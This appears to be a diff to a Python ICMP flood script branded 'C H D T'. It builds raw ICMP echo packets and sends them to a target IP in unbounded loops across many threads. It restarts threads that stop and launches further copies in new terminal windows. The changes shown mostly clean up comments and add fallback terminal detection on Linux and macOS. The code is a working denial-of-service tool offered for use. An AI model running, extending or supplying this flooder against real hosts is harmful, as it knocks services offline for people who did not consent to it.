@@ -5,8 +5,6 @@ import time
 import os
 import platform
 import subprocess
-
-
 import pyfiglet
 
 # Create ASCII art for 'C H D T'
@@ -23,6 +21,7 @@ output = f"{separator}\n{ascii_banner}\n{separator}\n{simple_text}"
 
 print(output)
 
+# Print separator again
 separator = '-' * max(len(ascii_banner.split('\n')[0]), len(simple_text))
 print(separator)
 
@@ -48,7 +47,6 @@ def checksum(source_string):
     answer = answer >> 8 | (answer << 8 & 0xff00)
     return answer
 
-
 # Build a custom ICMP echo request
 def create_icmp_packet():
     packet_id = int((os.getpid() & 0xFFFF) / 2)
@@ -58,8 +56,6 @@ def create_icmp_packet():
     header = struct.pack('bbHHh', 8, 0, socket.htons(my_checksum), packet_id, 1)
     return header + data
 
-
-# Function to send multiple ICMP packets in a loop
 # Function to send multiple ICMP packets in a loop
 def flood_icmp(target_ip, thread_id):
     try:
@@ -71,10 +67,7 @@ def flood_icmp(target_ip, thread_id):
             s.sendto(packet, (target_ip, 1))  # Send packet to the target
             sent_count += 1
 
-            # Print a success message for every sent packet (can slow down flooding)
-            # print(f"Thread {thread_id} successfully sent packet {sent_count}")
-
-            # Alternatively, print every 100 packets to avoid too much output
+            # Print every 100 packets to avoid too much output
             if sent_count % 100 == 0:
                 print(f"Thread {thread_id} successfully sent {sent_count} packets.")
 
@@ -84,7 +77,6 @@ def flood_icmp(target_ip, thread_id):
     finally:
         print(f"Thread {thread_id} completed sending ICMP packets.")
 
-
 # Function to resolve a domain to its IP address
 def resolve_domain(domain):
     try:
@@ -93,15 +85,30 @@ def resolve_domain(domain):
         print(f"Error: Could not resolve domain {domain}")
         exit(1)
 
-
 # Launch multiple instances of the script in new windows
 def launch_multiple_instances(num_windows, target_ip, num_threads):
-    for i in range(num_windows):
-        if platform.system() == 'Linux' or platform.system() == 'Darwin':  # Linux/macOS
-            command = f"gnome-terminal -- bash -c 'python3 {__file__} {target_ip} {num_threads}'"
-        elif platform.system() == 'Windows':
-            command = f"start cmd /k python {__file__} {target_ip} {num_threads}"  # Open new cmd window on Windows
+    terminal_cmd = None
 
+    # Determine which terminal to use based on availability
+    if platform.system() == 'Linux':
+        # Try gnome-terminal, xterm, and lxterminal as fallback options
+        for terminal in ['gnome-terminal', 'xterm', 'lxterminal', 'konsole']:
+            if subprocess.call(['which', terminal], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
+                terminal_cmd = terminal
+                break
+        if not terminal_cmd:
+            print("Error: No suitable terminal found. Please install gnome-terminal, xterm, or another terminal.")
+            return
+        command = f"{terminal_cmd} -- bash -c 'python3 {__file__} {target_ip} {num_threads}'"
+
+    elif platform.system() == 'Darwin':  # macOS
+        command = f"open -a Terminal python3 {__file__} {target_ip} {num_threads}"
+
+    elif platform.system() == 'Windows':
+        command = f"start cmd /k python {__file__} {target_ip} {num_threads}"
+
+    # Launch the instances
+    for i in range(num_windows):
         subprocess.Popen(command, shell=True)
         time.sleep(1)  # Wait 1 second between launching windows to avoid overload
 
@@ -170,7 +177,6 @@ def main():
                 threads[i] = threading.Thread(target=flood_icmp, args=(target_ip, i + 1))  # Restart thread
                 threads[i].daemon = True
                 threads[i].start()
-
 
 if __name__ == "__main__":
     main()
